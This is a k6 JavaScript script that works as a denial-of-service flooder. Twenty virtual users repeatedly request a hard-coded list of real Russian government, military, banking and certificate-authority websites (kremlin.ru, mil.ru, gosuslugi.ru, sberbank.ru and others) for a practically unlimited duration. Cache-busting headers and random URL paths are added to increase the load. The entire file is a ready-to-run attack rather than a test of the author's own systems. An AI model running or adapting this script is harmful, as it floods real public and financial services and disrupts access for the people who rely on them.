import http from 'k6/http';
import { sleep } from 'k6';

export let options = {
    noConnectionReuse: false,
    // vus: 20,
    vus: 20,
    duration: '100000000s'
}
function makeid(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() *
            charactersLength));
    }
    return result;
}


export default function () {
    let list = [
        'http://kremlin.ru/?fbclid=IwAR0CqKgsqwB3FZYA_ozYcv2KaS_6lWwhRJwdfFyVJjGiRzAYVmpZP05d3wc',
        `http://kremlin.ru`,
        'http://www.scrf.gov.ru',
        'https://ach.gov.ru',
        'https://epp.genproc.gov.ru',
        'https://www.gosuslugi.ru',
        'https://www.gosuslugi.ru',
        'https://www.sberbank.ru',
        'https://www.vtb.ru/',
        'https://www.gazprombank.ru/',
        'https://www.gosuslugi.ru/',
        'https://www.mos.ru/uslugi/',
        'http://government.ru/',
        'https://www.nalog.gov.ru/',
        'https://customs.gov.ru/',
        'https://pfr.gov.ru/',
        'https://rkn.gov.ru/',
        'https://shop-rt.com/',
        'https://iecp.ru/ep/ep-verification',
        'https://iecp.ru/ep/uc-list',
        'https://uc-osnovanie.ru/',
        'http://www.nucrf.ru',
        'http://www.belinfonalog.ru',
        'http://www.nwudc.ru',
        'http://www.roseltorg.ru',
        'http://www.astralnalog.ru',
        'http://www.center-inform.ru',
        'https://kk.bank/UdTs',
        'http://structure.mil.ru/structure/uc/info.htm',
        'http://www.ucpir.ru',
        'http://dreamkas.ru',
        'http://www.e-portal.ru',
        'http://izhtender.ru',
        'http://imctax.parus-s.ru',
        'http://www.icentr.ru',
        'http://www.kartoteka.ru',
        'http://rsbis.ru/elektronnaya-podpis',
        'http://www.stv-it.ru',
        'http://www.crypset.ru',
        'http://www.kt-69.ru',
        'http://www.24ecp.ru',
        'http://kraskript.com',
        'http://ca.ntssoft.ru',
        'http://www.y-center.ru',
        'http://www.rcarus.ru',
        'http://rk72.ru',
        'http://squaretrade.ru',
        'http://ca.gisca.ru',
        'http://www.otchet-online.ru',
        'http://udcs.ru',
        'http://www.cit-ufa.ru',
        'http://elkursk.ru',
        'http://www.icvibor.ru',
        'http://ucestp.ru',
        'http://mcspro.ru',
        'http://www.infotrust.ru',
        'http://epnow.ru',
        'http://ca.kamgov.ru',
        'http://mascom-it.ru',
        'http://cfmc.ru',
        'https://wikimapia.org/infu/',
        'https://wikimapia.org/z1/itiles/',
        'https://wikimapia.org',
        'https://mil.ru'
    ];


    const params = {
        headers: { 'Cache-Control': 'no-cache' },
    };

    let ip = http.get("http://jsonip.com/", params);
    console.log(ip.body);

    let res = http.get('https://www.vtb.ru/', params);
    console.log(res.status + res.url);
    let res2 = http.get('https://www.vtb.ru/' + `/${makeid(5)}=${makeid(5)}`, params);
    console.log(res2.status + res2.url);
    res = http.get('https://mil.ru', params);
    console.log(res.status + res.url);
    res2 = http.get('https://mil.ru' + `/${makeid(5)}=${makeid(5)}`, params);
    console.log(res2.status + res2.url);
    res = http.get('https://shop-rt.com/', params);
    console.log(res.status + res.url);
    res2 = http.get('https://shop-rt.com/' + `/${makeid(5)}=${makeid(5)}`, params);
    console.log(res2.status + res2.url);

    for (let i = 0; i < list.length; i++) {
        let res = http.get(list[i], params);
        console.log(res.status + res.url);
        let res2 = http.get(list[i] + `/${makeid(5)}=${makeid(5)}`, params);
        console.log(res2.status + res2.url);
    }


    // list.forEach(l => {
    //     let res = http.get(l, params);
    //     console.log(res.status + res.url);
    //     let res2 = http.get(l + `/${makeid(5)}=${makeid(5)}`, params);
    //     console.log(res2.status + res2.url);

    //     // let res3 = http.post(l, params);
    //     // console.log(res.status + res.url);
    //     // let res2 = http.post(l + `/${makeid(5)}=${makeid(5)}`, params);
    //     // console.log(res.status + res.url);
    // });
}